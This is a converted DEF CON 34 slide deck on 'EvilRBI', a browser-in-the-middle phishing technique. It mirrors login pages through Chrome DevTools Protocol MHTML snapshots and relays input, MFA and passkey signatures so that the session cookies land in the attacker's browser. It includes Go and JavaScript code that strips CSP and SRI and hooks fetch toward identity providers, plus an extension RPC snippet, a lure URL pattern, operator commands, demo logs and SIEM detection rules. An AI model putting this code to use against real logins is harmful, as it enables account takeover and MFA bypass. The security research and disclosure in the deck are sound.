---
title: "Reflections on Disregarding Trust (Weaponizing CDP and MHTML for Header-Agnostic Session Hijacking)"
speakers: ["Gregory Disney-Leugers"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: 2026
source_pdf: "DEF CON 34/DEF CON 34 - Gregory Disney-Leugers - Reflections on Disregarding Trust (Weaponizing CDP and MHTML for Header-Agnostic Session Hijacking) - 1umberhac.pdf"
pages: 46
sha256: "ce4df736661808a0ec798ffb0464cfc88b50f6e3640fca9aefc7130ddd6fc23c"
text_chars: 23919
ocr_pages: 35
has_ocr: true
redacted_secrets: 0
ocr_confidence: 89.8
ocr_unreliable_blocks: 0
vision_verified_pages_changed: 41
vision_verified_pages: 46
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:32:42Z"
---
# Reflections on Disregarding Trust (Weaponizing CDP and MHTML for Header-Agnostic Session Hijacking)

**Speakers:** Gregory Disney-Leugers  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Gregory Disney-Leugers - Reflections on Disregarding Trust (Weaponizing CDP and MHTML for Header-Agnostic Session Hijacking) - 1umberhac.pdf` (46 pages)


## Slide 1

# **REFLECTIONS ON DISREGARDING TRUST**

\```
Weaponization of CDP
and MHTML in Headless Session Hijacking
\```

SPEAKER BRIEFING

\```
Gregory Disney-Leugers
(1umberhack)
\```

## Slide 2

DEF CON 34 · T4 MAIN STAGE · 45 MIN

Follow-up to Reflections on Trusting Trust (1984)

# ACT I

#### THE FOLLOW-UP

Reflections on Trusting Trust · 1984 → runtime · 2026

~10 min

## Slide 3

Historical

\```
Forty years in the making
\```

Reflections on Trusting Trust `“The moral is obvious. You can't trust code that you did not totally create yourself. (Especially code from companies that employ people like me.) No amount of source-level verification or scrutiny will protect you from using untrusted code. In demonstrating the possibility of this kind of attack” -` _`Ken Thompson`_

## Slide 4

About the Speaker

\```
Who am I?
\```

Tech lead of offensive security

Developer  of:

- TunnelTug

- Phisheries

- 0TrustCloud

## Slide 5

#### THEORETICAL FOUNDATION

\```
Pillar 1: Dante's Inferno of Deflected Ownership
\```

The downward migration of security liability:

- LAYER 7: GOOD INTENTIONS
- LAYER 6: PRODUCT DEMAND
- LAYER 5: STANDARD EXEMPTIONS
- LAYER 4: CORPORATE CONSUMPTION
- LAYER 3: COMPLEX WRAPPERS
- LAYER 2: THE "SHOULD HAVE KNOWN" BIAS
- LAYER 1: THE ONUS ON THE USER (The Deepest Pit)

Downward migration of security liability.

## Slide 6

#### THEORETICAL FOUNDATION

\```
Pillar 2: The Law of Generalized Complexity Orchestration
\```

_"As a monolithic system use cases expand, it inevitably introduces features whose combined capabilities achieve functional parity with the underlying execution environment. When orchestrated in unintended ways, they systematically defeat the system's own isolation boundaries."_

## Slide 7

THEORETICAL FOUNDATION

\```
Pillar 3: The Four Constants of Emergent Vulnerabilities
\```

- **01 Modular Vacuum:** A component functions flawlessly in isolation.

- **02 Industry Vetting:** The mechanism adheres to all established industry standards.

- **03 Security Assumptions:** Security posture relies entirely on implicit trust of underlying boundaries.

- **04 Composite Failure:** Interaction of multiple vetted components exposes an exploit vector.

## Slide 8

DEF CON 34 · T4 MAIN STAGE · 45 MIN

Follow-up to Reflections on Trusting Trust (1984)

# ACT II

#### THE ATTACK

BiTM · one click · no zero-day

~11 min

## Slide 9

## AiTM vs BiTM

What sits in the middle — and what gets captured

| AiTM — Session tokens on the stream | BiTM — Real Chrome tab in the middle |
| --- | --- |
| Capture / inject cookies on HTTP | Clicks, keys, MFA, session |
| Victim browser still drives the UI | Victim sees a DOM mirror only |
| Tools: Evilginx, Modlishka | This talk: EvilRBI |
| Artifact: Set-Cookie on the wire | Artifact: upstream cookies |

EvilRBI is BiTM — victim mirror, chromedp authenticates, session harvest from middle browser.

## Slide 10

## Attack Roadmap

Seven steps · one click via TunnelTug

1. Deploy — EvilRBI proxy :8879 + chromedp
2. Lure — /dino?url= https://provider
3. Mirror — MHTML DOM via WebSocket
4. Relay — input → real upstream tab
5. Capture — cookies + telemetry
6. Bypass — MFA · FastPass · WebAuthn · EV
7. Harvest — session + client inventory

ONE-CLICK LURE

https://phisheries.dev/dino?url=https://provider

KEY INSIGHT

AiTM captures sessions on the stream. BiTM captures clicks, keys, MFA in the middle browser. EvilRBI is BiTM — no Chrome 0-days.

## Slide 11

OFFENSIVE ENGINEERING

\```
BitM Demo: Would you like to play a game of Dino?
\```

Left window — Chrome, "being controlled by automated test software": tabs `about:blank` and `chrome://dino/ - Dino game`, address bar `chrome://dino`, a "Restore pages? Chrome didn't shut dow[n]" prompt, and the offline Dino game showing "Press space to play".

Right window — RBI Proxy browser at `phisheries.dev/dino?`, bookmarks bar (Amazon.com, eBay, Booking.com, TripAdvisor, Facebook). Status line `Chrome foothold — 148.0.7778.271 · Windows 11 Version 19.0.0 (64-bit)`. Footer: "EV log.html service — Taking over log.html… | Open log.html | Log ALL | Clear", "Syncing input…".

RBI proxy log:

```text
10:24:06 chrome_mirror: navigation ok despite load error
10:24:06 chrome_mirror: navigation ok despite load error
10:24:06 rbi_session: phase        phase=streaming url=chrome://…
10:24:06 chrome_mirror: portal armed (local renderer) url…
10:24:07 chrome_mirror: navigation ok despite load error
10:24:08 chrome_mirror: navigation ok despite load error
10:24:08 rbi_client_details: cached    source=chromewebdata
10:24:08 rbi_client_probe: chromewebdata foothold probe c…
10:24:08 downstream_rpc: stored publish  seq=2 source=serv…
10:24:31 rbi_input: key relay      url=chrome://dino key=  cod…
10:24:31 rbi_session: phase        phase=settling url=chrome://d…
10:24:31 rbi_input: key ignored (not armed)  url=chrome://…
10:24:31 rbi_session: phase        phase=streaming url=chrome://…

q/Ctrl+C: quit   ↑/↓: scroll log   PgUp/PgDn: page log
```

## Slide 12

## System Architecture

Victim never talks to EvilRBI directly — the tunnel is the middle

VICTIM → TUNNEL → EVILRBI → PROVIDER

- **VICTIM** — Browser online / Sees a live mirror
- **TUNNEL** — TunnelTug apex / HTTPS → :8879
- **EVILRBI** — Proxy + chromedp / Holds the session
- **PROVIDER** — Real IdP / Google · Okta · Entra

KEY IDEA

- Tunnel terminates TLS — victim only hits the public apex
- Upstream Chrome holds the real IdP session via CDP
- No extension install — stock Chrome trust disregarded

## Slide 13

### **`THE PERFECT CLOAKING DEVICE`**

\```
STRUCTURAL SUPERIORITY OF THE DINO FOOTHOLD (CHROME-ERROR://CHROMEWEBDATA)
\```

#### **`RADIO SILENCE`**

\```
Forcing the browser into the
error state destroys the live
navigation pipeline. Network
timing telemetry, phase-
transition metrics, and
resource load hooks drop to
absolute zero, seamlessly
mimicking a routine local
network timeout.
\```

#### **`ONE-WAY MIRROR`**

\```
As an opaque, display-isolated
scheme, standard web-level
security tooling is completely
blocked from observing the DOM
or execution state. Client-
side scripts are blind, while
high-privilege CDP hooks
retain absolute control.
\```

#### **`STERILE STAGING`**

\```
Modifying API properties live
on a target page trips active
runtime defenses. The Dino
state serves as a sterile
staging ground where an
adversary can silently rewrite
objects and seed canvas
fingerprints in total radio
silence before redirect.
\```

## Slide 14

### ARCHITECTURAL CODIFICATION

\```
THE IMMUTABLE LEGACY OF CHROMIUM BUG 703801
\```

- **The Display-Isolated Mandate** Chromium Bug 703801 officially established chrome-error:// as a display-isolated scheme to protect internal error states from external web manipulation.

- **The Telemetry Asymmetry** The engineering fix successfully blocked standard web origins from sniffing or embedding the page, but explicitly preserved high-privilege communication channels (CDP/Extensions).

- **The Enforcement Loophole** Because the security boundary relies entirely on implicit trust of the underlying execution environment, it creates an asymmetric control plane where the defender is blind, but the automation harness is omniscient.

Chromium Bug 703801 commit note (screenshot):

> inline scripts. This could result in the error page not showing up correctly and/or false CSP reports being sent.
>
> The new scheme is marked as secure and as requiring an opaque origin to match previous behavior.
>
> Web pages used to be able to directly load the error URL, which just showed up as "chromewebdata". With this change, navigating to the error URL would bring up the external protocol dialog instead, so this CL prevents renderers from directly navigating to or redirecting to error URLs.
>
> Additionally, chrome-error:// is registered as a display-isolated scheme, so that regular web pages can't embed the error URL in an iframe or image, and as a scheme that does not allow javascript URL manipulation, which is consistent with other pages considered to be part of Chrome. If either of these new restrictions ends up being problematic, we should revisit them in RenderThreadImpl::RegisterSchemes().
>
> In the future, it's possible to further utilize the host/path portion of the URL to identify different kinds of error pages.

## Slide 15

DEF CON 34 · T4 MAIN STAGE · 45 MIN

Follow-up to Reflections on Trusting Trust (1984)

# ACT III

#### INSIDE THE PIPELINE

Mirror · relay · harvest

~11 min

## Slide 16

## Mirror Flow

Victim sees a live mirror · real session lives upstream

1. LURE — One click opens the portal
2. MIRROR — MHTML streams into Shadow DOM
3. RELAY — Clicks & keys hit real Chrome tab
4. AUTH — MFA upstream / Cookies stay there

THE LOOP

Victim action → upstream tab → snapshot → refreshed mirror

Pixel-faithful viewport · real session never leaves chromedp

## Slide 17

## Attack Component Map

Foothold → lure → origin → Service Worker

Part 1 of 2

1. **Deploy the proxy** — chromedp upstream on :8879 · chromewebdata foothold
2. **One-click lure** — TunnelTug apex · /dino?url= points at any https IdP
3. **Origin bypass** — Confused deputy — portal more privileged than a normal site
4. **Apex Service Worker** — Scope / · fetch intercept in privileged V8

## Slide 18

## Attack Component Map

EV C2 → RPC → mirror → MFA harvest

Part 2 of 2

5. **Built-in EV as C2** — offscreen agent · no CRX install required
6. **EV magic RPC** — Google's own component bridges cookies, idle, messaging
7. **DOM stream** — MHTML over WebSocket into Shadow DOM viewport
8. **Relay · MFA · harvest** — WebAuthn + FastPass complete upstream · session exported

## Slide 19

#### EXPLOIT MECHANICS

\```
Base64 URI: Security was considered (RFC 2397)
\```

ORIGINAL POINTS

- **01 / SCREENING BYPASS** — Firewall proxies attempting to block restricted media types will struggle to screen them when delivered via the "data" URL scheme.

- **02 / THE DOMAIN THREAT** — Implementers must remain acutely aware of these delivery vectors and proactively apply whatever precautions are necessary within their domain.

> Sites which use firewall proxies to disallow the retrieval of certain media types (such as application script languages or types with known security problems) will find it difficult to screen against the inclusion of such types using the "data" URL scheme. However, they should be aware of the threat and take whatever precautions are considered necessary within their domain.
>
> The effect of using long "data" URLs in applications is currently unknown; some software packages may exhibit unreasonable behavior when confronted with data that exceeds its allocated buffer size.
>
> — RFC 2397 · The "data" URL scheme · August 1998

## Slide 20

#### EXPLOIT MECHANICS

\```
MHTML: An archaic warning (RFC 2557)
\```

ORIGINAL POINTS

- **01 / LOCAL RESOLUTION** — Standards force all internal HTML URIs to resolve strictly within the local MHTML structure, completely isolating them from external network sources.

- **02 / THE TROJAN HORSE** — If an MHTML resource leaks into the general web cache, it can act as a Trojan Horse to inject completely misrepresented or spoofed web assets into the browser.

- **03 / BOUNDARY RESTRICTION** — Cached MHTML resources must never be accessible outside their specific multipart structure, explicitly preventing origin confusion and broad cache poisoning.

> When processing (rendering) a text/html body part in an MHTML multipart/related structure, all URIs in that text/html body part which reference subsidiary resources within the same multipart/related structure SHALL be satisfied by those resources and not by resources from any another local or remote source.
>
> Failure to honor this directive will allow a multipart/related structure to be employed as a Trojan Horse. For example, to inject bogus resources (i.e. a misrepresentation of a competitor's Web site) into a recipient's generally accessible Web cache.
>
> — RFC 2557 · MIME Encapsulation of Aggregate Documents · March 1999

## Slide 21

#### EXPLOIT MECHANICS

\```
chrome.PageCapture: Please don't rehydrate mhtml
\```

Chrome extension docs screenshot — **chrome.pageCapture**:

> Use the `chrome.pageCapture` API to save a tab as MHTML.
>
> MHTML is a standard format supported by most browsers. It encapsulates in a single file a page and all its resources (CSS files, images..).
>
> Note that for security reasons a MHTML file can only be loaded from the file system and that it can only be loaded in the main frame.

## Slide 22

#### EXPLOIT MECHANICS

## The Magic Phrase: Living off of Google EV

##### CRITICAL BYPASS MECHANICS

- **Mojo RPC Key:** The key is utilized to initiate RPC communication over Mojo for Google EV.

- **Sandbox Integrity:** Not considered a vulnerability because it operates without extension-level privilege, leaving the browser sandbox entirely unimpacted.

- **Offscreen Script:** Used to execute a custom offscreen_script.js for trusted Mojo-based communication with a component extension.

- Built-in to Chrome as component extension.

Chrome DevTools (Sources) screenshot — `chrome-extension://callobklhcbilhphinckomhgkigmfocg/offscreen.html`, with files `offscreen.html`, `offscreen_script.js`, and `background_service_worker.js`. The selected code fragment reads:

```text
…ame) && b.magic === 91556947316803 && (!a.id || a.…
```

## Slide 23

#### EXPLOIT MECHANICS

## Using the Magic Phrase: Drive By Magic Worker

##### CRITICAL BYPASS MECHANICS

- **Mojo RPC Key:** The key is utilized to initiate RPC communication over Mojo for Google EV.

- **Extension Level Communication:** The background_service_worker.js privileged with Mojo access and the perfect pipe to stream websocket traffic for DOM, keystroke, click captures.

- **Offscreen Script:** We leverage the EV key to use service workers to communicate with background_service_worker.js via our custom offscreen_script.js.

RPC sender code (screenshot):

```text
// RPC sender — primary path into installed EV background_service_worker.js (MessageChannel + SW).
function Oa(a,b,...c){
    return m(function*(){
        const d=new na, e={magic:91556947316803, host:a!==null&&typeof a==="number"?"*":a, method:b, args:c};
        function trySwPost(){
            return new Promise((resolve,reject)=>{
                if(typeof navigator==="undefined"||!navigator.serviceWorker||!navigator.serviceWorker.controller){
                    reject(new Error("Service Worker controller unavailable"));return}
                const channel=new MessageChannel();
                let settled=!1;
                const timer=setTimeout(()=>{if(settled)return;settled=!0;reject(new Error("SW RPC stall"))},10000);
                channel.port1.onmessage=(event)=>{if(settled)return;settled=!0;clearTimeout(timer);
                    const g=event.data;g.error!==void 0?reject(Pa(g.error)):resolve(g.result!==void 0?g.result:g)};
                try{navigator.serviceWorker.controller.postMessage(e,[channel.port2])}catch(err){
                    if(!settled){settled=!0;clearTimeout(timer);reject(err)}}})}
        function trySend(id){
            const g=typeof window!=="undefined"?window:typeof self!=="undefined"?self:null;
            const send=g&&g.__RBI_NATIVE_CHROME__&&g.__RBI_NATIVE_CHROME__.runtime&&g.__RBI_NATIVE_CHROME__.runtime.sendMessage;
            if(!send||!send.__RBI_NATIVE_SEND_MESSAGE__)return Promise.reject(new Error("native sendMessage unavailable"));
            return new Promise((resolve,reject)=>{function onResp(h){const j=chrome.runtime.lastError;
                if(j){reject(new Error(j.message));return}if(h&&h.error!==void 0)reject(Pa(h.error));
```

## Slide 24

## Browser-in-the-Middle · Three Primitives

Abstract → stack. Each cell is an intended API.

| 1 · CDP | 2 · MHTML → Data URI | 3 · JIT Shim |
| --- | --- | --- |
| page.CaptureSnapshot | parse multipart MHTML | hook fetch + XHR |
| format = MHTML | inline every asset | proxy IdP API calls |
| server-side Chrome tab | data:...;base64,... | post-MFA token path |
| scripts already executed | strip CSP / SRI / nonce | Okta · MS · Google · Shib |
| post-render live DOM | header-agnostic mirror | session stays upstream |

## Slide 25

## CDP Capture — Server-Side Render

proxy.go · chromedp holds the real IdP tab · legitimate scripts already ran

```text
// EvilRBI · capture viewport from upstream chromedp tab
var rawMHTML string
err := chromedp.Run(tabCtx,
    chromedp.ActionFunc(func(ctx context.Context) error {
        var err error
        rawMHTML, err = page.CaptureSnapshot()
            .WithFormat(page.CaptureSnapshotFormatMhtml)
            .Do(ctx)
        return err
    }),
)

// Parse multipart MHTML → HTML root + asset map
rawHTML, assets, err := parseMHTMLSnapshot(
    strings.NewReader(rawMHTML))
cache.ingest(assets)
best := bestOfflineHTML(rawHTML, cache.assets, pageURL)
htmlStr := hydrateSnapshotHTML(string(best), cache.assets)
out := prepareStageHTML([]byte(htmlStr), pageURL)

// Real browser already executed IdP JS.
// Snapshot is the live post-render DOM — not raw HTML.
// Stream self-contained result over /api/stream-sync.
```

## Slide 26

## Neutralize SRI & CSP — By Design

External assets → Base64 data URIs · strip integrity / CSP · self-contained live DOM

Go · hydrateSnapshotHTML:

```text
// proxy.go · sanitizeHTMLFragment
func sanitizeHTMLFragment(html string) string {
    html = cspRe.ReplaceAllString(html, "")
    html = cspAnyMetaRe.ReplaceAllString(html, "")
    html = sandboxAttrRe.ReplaceAllString(html, "")
    html = nonceRe.ReplaceAllString(html, "")
    html = integrityRe.ReplaceAllString(html, "")
    html = crossoriginRe.ReplaceAllString(html, "")
    return html
}

// Inline every MHTML part as a data URI
func assetDataURI(a MHTMLAsset) string {
    mt := normalizeDataURIMediaType(a.MediaType)
    return fmt.Sprintf("data:%s;base64,%s",
        mt, base64.StdEncoding.EncodeToString(a.Data))
}

func hydrateSnapshotHTML(html string,
    assets map[string]MHTMLAsset) string {
    urlMap := buildURLAssetLookup(assets)
    html = sanitizeHTMLFragment(html)
    html = replaceURLMap(html, urlMap) // → data:
    return resolveCIDInHTML(html, buildCIDLookup(assets))
}
```

JS · mhtml-hydrate.js:

```text
// mhtml-hydrate.js · client parity
function sanitizeHTML(html) {
  return String(html || "")
    .replace(/<meta[^>]*Content-Security-Policy/gi, "")
    .replace(/\s+sandbox(?:=...)/gi, "")
    .replace(/\s+nonce=['"][^'"]+['"]/gi, "")
    .replace(/\s+integrity=['"][^'"]+['"]/gi, "")
    .replace(/\s+crossorigin=['"][^'"]+['"]/gi, "");
}

function assetDataURI(mediaType, bytes) {
  let mt = String(mediaType || "application/octet-stream")
    .split(";")[0].trim();
  return `data:${mt};base64,${bytesToB64(bytes)}`;
}

// Why AiTM dies here:
// stream rewriters break SRI hashes & CSP nonces.
// BiTM never rewrites the wire —
// it serves a self-contained live DOM.

// SRI checks nothing when every asset is inline.
// CSP never binds the attacker mirror origin.
```

## Slide 27

## JIT JavaScript Shim — Post-MFA Harvest

auth_upstream_fetch_shim.js · hook fetch/XHR · trap tokens after MFA

```text
/** RBI auth mirror network shim.
 *  Display-only mirrors must not call IdP APIs directly.
 *  Input relays to chromedp; post-MFA session stays upstream. */
(function () {
  if (window.__RBI_AUTH_FETCH_SHIM__) return;
  window.__RBI_AUTH_FETCH_SHIM__ = true;
  var PROXY = "/api/rbi/upstream-fetch";

  function isAuthUpstreamHost(hostname) {
    var h = String(hostname || "").toLowerCase();
    return h.endsWith(".okta.com")
      || h.endsWith(".microsoftonline.com")
      || h.endsWith(".google.com")
      || h.endsWith(".live.com")
      || h.endsWith(".aws.amazon.com")
      /* Shibboleth / campus SSO via shouldProxy patterns */
      || /shibboleth|sso\./i.test(h);
  }

  var origFetch = window.fetch.bind(window);
  window.fetch = function (input, init) {
    var url = typeof input === "string" ? input : input.url;
    if (!shouldProxy(url)) return origFetch(input, init);
    // Just-in-time: only when the mirror hits an IdP API
    url = PROXY + "?url=" + encodeURIComponent(absURL(url));
    init = Object.assign({}, init || {}, {
      credentials: "same-origin", mode: "cors"
    });
    return origFetch(url, init);  // response / tokens via upstream
  };
```

## Slide 28

## Architecture — Communication

Every arrow is an intended API · no Chrome zero-day

VICTIM → (viewport ↔ input) → PROXY → (CDP ↔ cookies) → UPSTREAM

- **VICTIM** — Mirror viewport / Clicks & keys out / Passkey / FastPass
- **PROXY** — Stream sync hub / Input relay / MFA + EV bridges
- **UPSTREAM** — Real IdP tab / MHTML snapshots / Session cookies

- **IdP** — Real auth session
- **Google EV** — Built-in component
- **WebAuthn** — MS · GitHub · passkeys.io

Upstream → IdP · victim borrows EV · WebAuthn on victim device

## Slide 29

## Internet Exposure via TunnelTug

Apex HTTPS → localhost:8879 · single-click lure

1. CLICK — Victim opens /dino?url=IdP
2. TUNNEL — TunnelTug HTTPS → :8879
3. BiTM — EvilRBI proxy mirror + relay
4. BROWSER — Mirrored IdP + built-in EV

OPERATOR SETUP

- proxy.exe --prod
- tunneltug -prod -routing direct
- public_url matches apex

SINGLE-CLICK LURE

https://phisheries.dev/dino?url=…

Any https IdP on /dino · one click on the internet

## Slide 30

## WebAuthn — The Problem

Passkeys bind to origin + device · BiTM splits them

- **UPSTREAM** — Attacker Chrome runs the real IdP · Challenge issued here — no key
- **MIRROR** — Victim only sees a cloned viewport · Can't complete WebAuthn on the lure origin
- **BINDING** — Origin must match the real IdP · Wrong origin = IdP rejects

KEY LINE

You cannot complete a passkey on the wrong machine with the wrong origin.

## Slide 31

## WebAuthn — The Relay

Victim signs · middle browser gets the session

1. CHALLENGE — IdP asks for passkey upstream
2. RELAY — Proxy ships options to victim
3. SIGN — Victim signs at true RP origin
4. WIN — Assertion returns Cookies upstream

Microsoft · GitHub · passkeys.io · Entra · Google

## Slide 32

## WebAuthn — Why It Works

Origin check passes · authenticator is real · session upstream

1. ORIGIN — Temp tab at the true RP origin
2. AUTHENTICATOR — Victim's real passkey signs
3. SESSION — Cookies land on attacker Chrome

THREAT MODEL

“Passkeys stop phishing” fails when the challenge is issued to an attacker session.

## Slide 33

DEF CON 34 · T4 MAIN STAGE · 45 MIN

Follow-up to Reflections on Trusting Trust (1984)

# ACT IV

#### PROOF

5 demos · ~1 min each

~5 min

## Slide 34

Demo

Demo: Mircosoft

Left window — Chrome, "being controlled by automated test software", at `login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445…`, showing the Microsoft "Sign in" page.

Middle window — RBI Proxy terminal (`RBI Proxy :8879 | mirror=rbi | dev/headed`), columns TYPE / REMOTE / TARGET / TIME / KIND, row `viewer  127.0.0.1:64895  https://login.mi…  15:40:27`, and the live log:

```text
15:40:45 ev_rpc: stub relay          method=recordLog source=…
15:40:45 ev_rpc: stub relay          method=recordLog source=…
15:40:45 ev_rpc: stub relay          method=recordLog source=…
15:40:45 ev_rpc: stub relay          method=recordLog source=…
15:40:45 ev_rpc: stub relay          method=recordLog source=…
15:40:53 downstream_rpc: stored publish   seq=9  sour…
15:40:53 downstream_rpc: stored publish   seq=10 sou…
15:40:53 downstream_rpc: stored publish   seq=11 sou…
15:41:03 ev_rpc: stub relay          method=uiEvent source=…
15:41:03 ev_rpc: stub relay          method=getQuirks source=…
15:41:03 ev_rpc: stub relay          method=getLogBuffer sou…
15:41:03 downstream_rpc: stored publish   seq=15 sou…
15:41:05 proxy_pipeline: Capturing from shared upst…
15:41:05 downstream_rpc: stored publish   seq=16 sou…
15:41:06 chrome_mirror: navigation ok despite load…
15:41:06 upstream_action: Navigating shared tab ur…

q/Ctrl+C: quit   ↑/↓: scroll log   PgUp/PgDn: page log
```

Right window — RBI Proxy viewer browser at `https://phisheries.dev/dino?url=https://login.microsoftonline.c…`, status `Viewer browser — 150.0.4078.48 (Official build) (64-bit) · Windows 11 Version 19.0.0 (64-bit)`, mirroring the Microsoft "Sign in" page (Email, phone, or Skype · No account? Create one! · Next · Sign-in options).

## Slide 35

Demo

Demo: Google

Left window — Chrome, "being controlled by automated test software", tab "Sign in - Google Accounts". Two PowerShell windows.

Middle window — RBI Proxy terminal (`RBI Proxy :8080 | mirror=rbi | dev/headed | chrome=…`), columns TYPE / REMOTE / TARGET / TIME / KIND / URL, row `viewer  127.0.0.1:62316  https://accounts…  09:38:41  auth  https…`, and the live log:

```text
09:38:44 auth_debug: stage_prepare    url=https://accounts.goo…
09:38:44 auth_debug: mirror_capture   source=google_html_eval…
09:38:44 rbi_session: phase           phase=streaming url=https://acc…
09:38:44 auth_debug: mirror_pushed    url=https://accounts.goo…
09:38:44 rbi_mirror: chromedp auth viewport pushed  url=http…
09:38:45 auth_debug: stage_prepare    url=https://accounts.goo…
09:38:45 auth_debug: mirror_capture   source=google_html_eval…
09:38:45 auth_debug: mirror_push_skip reason=hash_unchanged…
09:38:46 auth_debug: stage_prepare    url=https://accounts.goo…
09:38:46 auth_debug: mirror_capture   source=google_html_eval…
09:38:46 auth_debug: mirror_push_skip reason=hash_unchanged…
09:38:47 auth_debug: stage_prepare    url=https://accounts.goo…
09:38:47 auth_debug: mirror_capture   source=google_html_eval…
09:38:47 auth_debug: mirror_push_skip reason=hash_unchanged…
09:38:47 auth_debug: mirror_settle_done  url=https://account…
09:38:47 rbi_mirror: auth viewport pushed  url=https://accou…

q/Ctrl+C: quit   ↑/↓: scroll log   PgUp/PgDn: page log
```

Right window — RBI Proxy viewer browser at `phisheries.dev/dino`, status `Viewer browser — 148.0.7778.271 · Windows 11 Version 19.0.0 (64-bit)`, mirroring Google "Sign in — with your Google Account. This account will be available to other Google apps in the browser." Email-or-phone field with autofill entries `gregory.disney.leugers@gmail.com` and `gregory.disney@owasp.org`; "Forgot email?", "Not your computer? Use Guest mode to sign in privately. Learn more about using Guest mode", "Create account", "Next"; footer "English (United States) · Help · Privacy · Terms".

## Slide 36

Demo

Demo: Okta

Left window — Chrome, "being controlled by automated test software", tab "owasp-trial-2096971 - Sign In", at `trial-2096971.okta.com/oauth2/v1/authorize?client_id=okta.2b1959c8-bcc0-56eb-a589-cfcfb…`. Page: "Connecting to … / Sign in with your account to access Okta Dashboard", Okta logo, "Sign In / Username: gregory.disney@owasp.org / Keep me signed in / Next / Help".

Right window — RBI Proxy viewer browser at `phisheries.dev/dino`, status `Viewer browser — 149.0.7827.197 · Windows 11 Version 19.0.0 (64-bit)`, mirroring the same Okta "Connecting to … / Sign in with your account to access Okta Dashboard" page — Okta logo, "Sign In / Username: gregory.disney@owasp.org / Keep me signed in / Next / Help", footer "Powered by Okta · Privacy Policy".

## Slide 37

Demo

Demo: AWS

Left window — Chrome, "being controlled by automated test software", tabs `about:blank` and `chrome://dino/ - Dino game`. A Windows PowerShell window at the left edge, largely off-screen (only fragments of prompts and timestamps are legible in the source).

Right window — RBI Proxy viewer browser at `phisheries.dev/dino?url=…`, bookmarks bar (Amazon.com, eBay, Booking.com, TripAdvisor, Facebook), showing the message:

```text
Local application is not running.
```

## Slide 38

Demo

Demo: Github

Left window — Chrome, "being controlled by automated test software", tab "Sign in to GitHub · GitHub" at `github.com/login`. Page: "Sign in to GitHub / Username or email address / Password (Forgot password?) / Sign in / or / Continue with Google / Continue with Apple / New to GitHub? Create an account / Sign in with a passkey / Terms · Privacy".

Right window — RBI Proxy viewer browser at `phisheries.dev/dino?url=https://g…`, status `Viewer browser — 149.0.7827.201 · Windows 11 Version 19.0.0 (64-bit)`, mirroring the same GitHub "Sign in to GitHub" page (Username or email address / Password / Sign in / Continue with Google / Continue with Apple / New to GitHub? Create an account / Sign in with a passkey).

## Slide 39

DEF CON 34 · T4 MAIN STAGE · 45 MIN

Follow-up to Reflections on Trusting Trust (1984)

# ACT V

#### DISREGARDING TRUST

Thompson's question · runtime scale · exit

~8 min

## Slide 40

Demo

DBSC: A Total Eclipse of the Identity

Left window — Chrome, "being controlled by automated test software", at `0trust.cloud/auth`. Page: 0Trust.Cloud — "Sign in with your passkey to access the platform.", username `admin_4`, buttons "Sign In with Passkey" and "Register Passkey". DevTools (Application) is open on the right: the Storage tree (Local/Session Storage, Extension storage, IndexedDB, Cookies, Private State Tokens, Interest Groups, Shared Storage, Cache storage, Storage Buckets; Background Services; Frames → top) and an Events table whose rows are all `Creation · 7/3/20… · Error`, with "Preserve log", "Event details", "Site", "Session ID".

Right window — RBI Proxy viewer browser at `https://phisheries.dev/dino?url=https://0trust.cloud`, status `Viewer browser — 149.0.4022.98 (Official build) (64-bit) · Windows 11 Version 19.0.0 (64-bit)`, mirroring the same 0Trust.Cloud passkey page (`admin_4`, "Sign In with Passkey", "Register Passkey"). Footer: "Passkey step — use your passkey or click Try another way".

## Slide 41

#### EXPLOIT MECHANICS

\```
DBSC: Will not protect registration
\```

DBSC spec — 2.1. Non-goals:

> DBSC will not prevent temporary access to the browser session while the attacker is resident on the user's device. The private key should be stored as safely as modern operating systems allow, preventing exfiltration of the session private key, but the signing capability will likely still be available for any program running as the user on the user's device.
>
> DBSC will also not prevent an attack if the attacker is replacing or injecting into the user agent at the time of session registration, as the attacker can bind the session either to keys that are not TPM bound, or to a TPM that the attacker controls permanently.
>
> DBSC is not designed to give hosts any sort of guarantee about the specific device a session is registered to, or the state of this device.

## Slide 42

#### EXPLOIT MECHANICS

\```
Webauthn: Also will not protect registration
\```

WebAuthn spec — 13.4.4. Attestation Limitations:

> This section is not normative.
>
> When registering a new credential, the attestation statement, if present, may allow the WebAuthn Relying Party to derive assurances about various authenticator qualities. For example, the authenticator model, or how it stores and protects credential private keys. However, it is important to note that an attestation statement, on its own, provides no means for a Relying Party to verify that an attestation object was generated by the authenticator the user intended, and not by a man-in-the-middle attacker. For example, such an attacker could use malicious code injected into Relying Party script. The Relying Party must therefore rely on other means, e.g., TLS and related technologies, to protect the attestation object from man-in-the-middle attacks.
>
> Under the assumption that a registration ceremony is completed securely, and that the authenticator maintains confidentiality of the credential private key, subsequent authentication ceremonies using that public key credential are resistant to tampering by man-in-the-middle attacks.

## Slide 43

DETECTION · 0TrustCloud SIEM

## EvilRBI.Phisheries — what actually fires

Client → IdP only · builtin · pb_evilrbi_phisheries_critical · threshold 1 / 600s

**CRITICAL · BUILTIN — EvilRBI.Phisheries — virtual authenticator (client)**

WebAuthn registration with null/software AAGUID

CDP virtual authenticator / BiTM Path B

```text
rule_evilrbi_virtual_authenticator  ·  match: virtual_authenticator | null aaguid | aaguid=00000000
actions: WEBAUTHN_REGISTER / WEBAUTHN_REGISTER_FINISH  ·  fires on register
```

**CRITICAL · BUILTIN — EvilRBI.Phisheries — new DBSC device after login**

new_dbsc_device · hardware session binding registered

BiTM binds DBSC to attacker Chrome — IdP sees a new device

```text
rule_evilrbi_new_dbsc_device  ·  match: new_dbsc_device | hardware session binding | dbsc
actions: DBSC_REGISTER  ·  example: count=6 admin @ 0trust.cloud
```

KEY LINE

You don't catch the middle browser on the wire.

You catch virtual-auth AAGUID on register — and the new DBSC device it left behind.

## Slide 44

DEF CON 34 · T4 MAIN STAGE

# THE MORAL IS OBVIOUS.

A follow-up to Reflections on Trusting Trust · 1984

